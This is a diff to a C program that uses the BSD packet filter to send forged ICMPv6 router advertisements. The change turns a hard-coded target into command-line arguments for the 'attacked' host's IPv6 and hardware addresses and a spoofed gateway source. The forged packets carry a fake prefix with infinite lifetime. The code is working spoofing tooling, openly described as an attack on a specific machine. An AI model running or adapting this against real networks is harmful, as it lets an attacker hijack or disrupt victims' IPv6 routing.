@@ -38,17 +38,6 @@
 #include <string.h>
 #include <unistd.h>
 
-/* These must match
-#define ALL_LINKLOCAL_NODES 	"FF02::1"
-#define ALL_LINKLOCAL_NODES_HW	"33:33:00:00:00:01"
-*/
-/* Forget multicast, we are supposed to attack only a specific machine */
-#define ALL_LINKLOCAL_NODES     "fe80::215:c5ff:fe33:7748"
-#define ALL_LINKLOCAL_NODES_HW	"00:15:c5:33:77:48"
-/* My Address */
-#define IP6_ADDRESS		"fe80::beae:c5ff:fe80:104"
-
-
 extern char *__progname;
 
 struct pseudo_icmp_hdr {
@@ -72,16 +61,22 @@ main(int argc, char *argv[])
 	struct ether_header eh;
 	struct ip6_hdr ip6;
 	struct ether_addr *eha;
-	struct in6_addr in6;
+	struct in6_addr in6_prefix;
 	struct nd_router_advert nra;
 	struct nd_opt_prefix_info nopi;
 	struct pseudo_icmp_hdr pih;
 	struct iovec iov[4];
-
-	if (argc != 3)
-		errx(1, "usage: %s ifname prefix6", __progname);
-	bzero(&in6, sizeof(in6));
-	if (inet_pton(AF_INET6, argv[2], &in6) != 1)
+	const char *attacked6, *attackedhw, *gateway, *ifname;
+	
+	if (argc != 5)
+		errx(1, "usage: %s ifname attacked-6 attacked-hw gateway",
+		    __progname);
+	ifname	   = argv[1];
+	attacked6  = argv[2];
+	attackedhw = argv[3];
+	gateway	   = argv[4];
+	
+	if (inet_pton(AF_INET6, "3030::", &in6_prefix) != 1)
 		errx(1, "inet_pton");
 	/* Berkeley Packet Filter */
 	if ((bpf = open("/dev/bpf5", O_RDWR)) == -1)
@@ -96,7 +91,7 @@ main(int argc, char *argv[])
 	nopi.nd_opt_pi_len	  = 4;
 	nopi.nd_opt_pi_prefix_len = 0x40; /* sizeof(struct in6_addr); */
 	nopi.nd_opt_pi_valid_time = 0xFFFFFFFF;
-	nopi.nd_opt_pi_prefix 	  = in6;
+	nopi.nd_opt_pi_prefix 	  = in6_prefix;
 	/* ICMPv6 */
 	bzero(&nra, sizeof(nra));
 	nra.nd_ra_type		  = ND_ROUTER_ADVERT;
@@ -113,9 +108,9 @@ main(int argc, char *argv[])
 	ip6.ip6_hops = 0xFF;
 	ip6.ip6_plen = htons(sizeof(nra) + sizeof(nopi));
 	/* ip6.ip6_plen = htons(sizeof(nra)); */
-	if (inet_pton(AF_INET6, ALL_LINKLOCAL_NODES, &ip6.ip6_dst) != 1)
+	if (inet_pton(AF_INET6, attacked6, &ip6.ip6_dst) != 1)
 		errx(1, "inet_pton");
-	if (inet_pton(AF_INET6, IP6_ADDRESS, &ip6.ip6_src) != 1)
+	if (inet_pton(AF_INET6, gateway, &ip6.ip6_src) != 1)
 		errx(1, "inet_pton");
 	/* Finish Icmp, Checksum Calc */
 	bzero(&pih, sizeof(pih));
@@ -129,7 +124,7 @@ main(int argc, char *argv[])
 	/* Ethernet */
 	bzero(&eh, sizeof(eh));
 	eh.ether_type = htons(ETHERTYPE_IPV6);
-	eha = ether_aton(ALL_LINKLOCAL_NODES_HW);
+	eha = ether_aton(attackedhw);
 	if (eha == NULL)
 		errx(1, "ether_aton");
 	memcpy(eh.ether_dhost, eha, ETHER_ADDR_LEN);
